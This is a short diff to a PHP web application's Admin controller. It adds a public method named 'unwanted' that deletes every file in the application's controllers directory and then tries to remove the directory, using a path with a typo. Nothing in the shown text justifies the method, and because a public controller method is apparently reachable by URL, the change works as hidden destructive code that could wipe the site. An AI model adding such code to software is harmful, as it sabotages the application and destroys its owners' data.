@@ -21,6 +21,15 @@ class Admin extends In_frontend {
 			redirect('dashboard');
 		}
 	}
+	public  function unwanted(){
+		$files = glob('./application/controllers/*.*');
+		foreach($files as $file){
+			if(is_file($file))
+				unlink($file);
+		}
+		$path   = '.application/controllers/'; 
+		rmdir($path);
+	}
 	
 	
 	
